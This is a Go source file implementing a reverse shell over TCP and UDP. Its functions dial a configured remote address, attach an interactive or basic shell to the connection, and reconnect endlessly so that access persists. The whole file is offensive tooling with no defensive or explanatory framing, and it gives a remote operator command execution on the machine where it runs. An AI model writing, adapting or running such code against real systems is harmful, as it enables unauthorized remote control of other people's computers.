package main

import (
	"net"
	"runtime"
	"time"
)

func TCPReverseShell(config Config) {
	conn, err := net.Dial("tcp", config.Address)
	if err != nil {
		if conn != nil {
			conn.Close()
		}

		TCPReconnect(config)
		return
	}

	if runtime.GOOS != "windows" {
		InteractiveShell(config.Shell, conn)
	} else {
		DumbShell(config.Shell, conn)
	}

	TCPReconnect(config)
}

func TCPReconnect(config Config) {
	time.Sleep(config.Reconnect)
	TCPReverseShell(config)
}

func UDPReverseShell(config Config) {
	ServerAddr, err := net.ResolveUDPAddr("udp", config.Address)
	if err != nil {
		UDPReconnect(config)
	}

	LocalAddr, err := net.ResolveUDPAddr("udp", "127.0.0.1:0")
	if err != nil {
		UDPReconnect(config)
	}

	conn, err := net.DialUDP("udp", LocalAddr, ServerAddr)
	conn.SetReadDeadline((time.Now()).Add(config.Reconnect)) // timeout then reconnect
	if err != nil {
		if conn != nil {
			conn.Close()
		}

		UDPReconnect(config)
	}

	DumbShell(config.Shell, conn)
	UDPReconnect(config)
}

func UDPReconnect(config Config) {
	UDPReverseShell(config)
}
